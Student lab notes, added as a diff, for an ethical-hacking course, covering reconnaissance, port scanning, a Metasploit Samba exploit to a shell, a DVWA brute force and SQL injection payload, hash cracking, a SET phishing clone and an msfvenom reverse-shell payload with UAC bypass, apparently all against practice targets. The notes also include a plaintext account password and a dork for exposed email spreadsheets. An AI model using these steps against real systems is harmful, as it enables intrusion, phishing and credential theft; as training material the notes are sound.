@@ -1,0 +1,360 @@
+#Practical 1 
+Aim: Perform Footprinting and Reconnaissance (Passive Information Gathering) 
+
+a. Windows/Linux Command Line Utilities
+
+In windows cmd prompt
+curl / wget What: Fetch HTTP(S) responses and headers;
+curl -I kali.org
+
+In Kali
+Whoami command line utility 
+
+whois certifiedhacker.com
+
+Dig Command Line Utility 
+dig certifiedhacker.com
+
+b. Whois Enumeration 
+http://whois.domaintools.com
+
+c. Google Hacking 
+
+“google search operators” site:google.com
+allinurl:google search operators
+inurl:google search operators
+Cybersecurity filetype:pdf
+define:cybersecurity
+intitle:login site:eccouncil.org
+
+d. Netfcraft
+
+Navigate to https://sitereport.netcraft.com/ and enter https://certifiedhacker.com/ and click on LookUp
+Now we got the site report, click on cetifiedhacker.com beside of domain to get the sub domains of the target
+
+e. Recon-ng
+
+recon-ng
+marketplace install all
+modules search
+workspaces create mscybersecurity
+workspaces list
+db insert domains
+certifiedhacker.com
+notes skip and enter
+modules load recon/domains-hosts/brute_hosts
+run
+back
+modules load recon/hosts-hosts/reverse_resolve
+run
+show hosts
+back
+modules load reporting/html
+options set CREATOR udit
+options set CUSTOMER IT
+options set FILENAME /home/kali/Desktop/results.html
+
+f. Shodan
+username:bruce119
+password:12345678
+
+product: PostgreSQL org:"Beijing Teletron Telecom Engineering Co. Ltd." 
+
+click on first IP and we can see all its publicly available info regarding the vulnerable service
+
+g. Searching for Email Addresses 
+
+For searching the email addresses online, use Google Dorking query: 
+filetype:xls inurl:"email.xls" 
+open and view any of them
+
+#Practical 2 
+Aim: Perform Footprinting and Reconnaissance (Active Information Gathering) 
+
+a. DNS Enumeration
+
+https://www.kloth.net/services/nslookup.php
+Domain : certifiedhacker.com
+Server : localhost
+Query : CNAME
+
+b. Port Scanning
+
+TCP connect/Full Scan
+nmap -sT <kali_ip>
+
+Stealth Scan
+nmap -sS -v <target_ip>
+
+X-mas Scan 
+nmap -sX <target_ip>
+
+c. SMB Enumeration
+
+IN kali (commands only)
+
+nmap -sV <target_IP> -o nmap_full_scan
+msfconsole -q
+cat nmap_full_scan
+#139-netbois-ssnSamba
+search smb_version
+use 0
+show options
+set RHOSTS <target_IP>
+set RPORTS 139
+run 
+#samba 3.0.20 - Debian
+search Samba 3.0.20
+use 0
+show options
+set RHOSTS <target_IP>
+run
+shell 
+whoami
+
+#Practical 3 
+Aim: Perform Footprinting and Reconnaissance (User Information Gathering)
+ 
+a. Email Harvesting
+
+Go to kali linux and start the Harvester tool for email harvesting 
+Enter command “theHarvester -d facebook.com -l 500 -b baidu” 
+
+b. Password Dumps
+
+https://breachdirectory.org/ and enter your email address to see whether your email password 
+is exposed in data breach attack or not 
+
+c. OSINT Framework
+
+https://osintframework.com/
+
+d. Maltego
+On Kali Linux Start the Maltego and drag and drop the website entity from the left pane of the Entity Palette
+Right click on website and click To Domain [DNS] to get the domains of the websites
+Right-click the certifiedhacker.com entity and select All Transforms ---> To DNS Name [Using Name Schema diction...]
+Right-click the certifiedhacker.com entity and select All Transforms --> To DNS Name SOA (Start of Authority)
+Right-click the certifiedhacker.com and select All Transform --> To Entities from WHOIS [IBM Watson].
+Right-click the website and select All Transforms --> To IP Address [DNS]
+Right-click the IP address entity and select All Transforms --> To location [city, country]
+
+#Practical 4 
+Aim: Capturing Traffic and Network Discovery 
+
+a. Wireshark
+
+Start wireshark -> Start Capture ->  go to 
+http://testphp.vulnweb.com/login.php and enter the credentials 
+
+b. TCPdump
+
+Start tcpdump in kali Liux and type following command: 
+sudo tcpdump -i eth0 -c 15 -w sample.pcap 
+This will capture 15 packets and save it to a file sample.pcap 
+
+Now open the sample.pcap file using wireshark
+
+c. Nmap
+
+IDLE/IPID Header Scan
+nmap -sI 192.168.100.11 <target_ip> 
+
+SCTP INIT Scan
+nmap -sY -v <target_ip>
+
+SCTP COOKIE ECHO scan
+nmap -sZ <target_ip>
+
+#Practical 5 
+Vulnerability Analysis
+
+a. Nessus
+
+Kali -> Firefox -> tenable -> download tenable nessus package file. -> Linux Debian amd64
+
+IN TERMINAL
+cd Downloads
+ls
+sudo dpkg -i ./Nessus
+/bin/systemctl start  nessusd.service
+
+Firefox -> kali:8834 
+Policies -> create new policy -> Advanced Scan
+Settings -> Discovery Ports -> Port Scanning -> tick TCP ports
+Credentials -> SSH on -> Authentication method (password) -> username: msfadmin password : msfadmin -> save
+folders -> Myscan -> +newscan -> user defined -> testscan -> metasploitable IP 
+start metasploitable machine and enter its ip in target IP -> Launch 
+
+in terminal 
+/bin/systemctl stop nessusd.service 
+
+b. Nmap
+
+nmap --script vuln <target_ip>
+
+c. Metasploit
+
+In kali 
+searchsploit ssh login 
+
+msfconsole -q
+use scanner/ssh/ssh_login
+use options
+info -d
+
+#Practical 6 
+Aim: Web Application Scanning 
+
+a. Nikto
+
+nikto -h <target_ip>
+
+b. Dirb 
+
+dirb http://<target_ip>
+
+c. Burp Suite
+
+In Kali Terminal 
+sudo apt install dvwa
+dvwa-start
+
+in dvwa side panel select Brute Force
+
+Start Burp Suite and capture request that request in which we get username=test&password=test&Login=Login
+
+Now right click the request and click send to Intruder option on list
+
+Now select the username and password field values and click add$  
+
+Now for payloads will be using cluster-bomb attack and in side pane we have payload tab select 1 and Simple list for writing usernames and then select 2 and Simple list for writing Password payloads....the list for username and 
+password and click start attack enter the values in list manually 
+
+• Now focus on length, sort  descending way and we get username as admin and password 
+as password, now try login using this credentials.
+
+d. Sql Injection 
+
+in dvwa select SQL injection from side pane
+
+1
+?id=1' OR '1'='1
+
+#Practical 7 
+Aim: Password Cracking Tools / Password Attacks 
+
+a. Winrtgen
+
+Go to windows machine and start the winrtgen to generate a rainbow table , select the 
+hash MD5 and MAX Length 3 Chain len 1000 and chain count 1000 charset loweralpha and click OK 
+Now select the MD5 file and click on start
+.rt file will be generated, now we will use this file to crack the hash  of  target machine 
+IN KALI
+rtsort /usr/share/rainbowcrack
+echo -n "qwe" | md5sum
+rcrack /usr/share/rainbowcrack -h <hash_value from previous output>
+
+OR 
+
+IN KALI ONLY 
+rtgen 
+rtgen md5 loweralpha 1 4 0 1000 1000 0
+rtsort /usr/share/rainbowcrack
+echo -n "qwe" | md5sum
+rcrack /usr/share/rainbowcrack -h <hash_value from previous output>
+
+b. PWDump and Ophcrak
+
+download pwdump7 
+run cmd ad administrator 
+Download the pwdump7 exe and execute in windows using command prompt, it will fetch 
+and display the password hashes. 
+
+OPHcrack
+
+c. Hydra 
+On metasploitable machine...
+ip -a  --> to find its IP
+
+In kali mousepad wordlist.txt enter some passwords in it and save in directory
+
+hydra -l msfadmin -p /home/kali/udit/wordlist.txt -vV -f ftp://<target_ip>
+
+d. John the ripper
+
+mousepad hash.txt
+185f8db32271fe25f561a6fc938b2e264306ec304eda518007d1764826381969
+#paste this (encrypted SHA256 hash of Hello)
+
+john hash.txt
+
+e. hashcat
+
+hashcat -m 0 hash.txt /home/kali/udit/wordlist.txt --show
+
+#hash.txt contains encrypted text 
+#wordlist.txt contain Plain text (Hello)
+
+g. Cain and Abel 
+Open Cain and navigate to cracker and then select MD5  Hashed then click “+” button to add the MD5 hash to crack 
+Now right click on the hash and select dictionary attack
+Select the wordlist and click on start button  to start the attack, as it cracks the hash it stops and gives the plain text for it 
+
+#Practical 8
+Aim: Social Engineering 
+
+Open Kali -> Application -> SET
+1
+2
+3
+2
+skip IP 
+enter URL : http://testphp.vulnweb.com/login.php
+
+Now go to http:<IP will be provided in skip IP> the phishing page will appear now enter the crendentials
+
+come to terminal, the credentials will be displayed 
+
+#Practical 9 
+Aim: Privilege Escalation 
+
+a. Windows Privilege Escalation
+
+msfvenom -p winodws/meterpreter/reverse_tcp LHOST=<kali_ip> LPORT=6767 -f exe > evil.exe
+
+#To send exe file we have to make kali as server
+
+python -m http.server 80
+
+Windows -> browser -> <kali_ip>:80
+
+click on evil.exe -> save 
+
+In Kali 
+msfconsole -q 
+use exploit/multi/handler
+set payload winodws/meterpreter/reverse_tcp
+set LHOST <kali_ip>
+set LPORT 6767
+run
+ 
+execute the evil.exe on windows machine 
+Here we get the meterrpreter session for the windows and now we can do anything with it
+
+getuid
+
+msfconsole -q
+use exploit/multi/handler
+use exploit/winodws/local/bypassuac
+show options
+set session 1 
+run 
+getuid
+
+b. Linux Privilege Escalation SKip
+
+
+
+
+
+
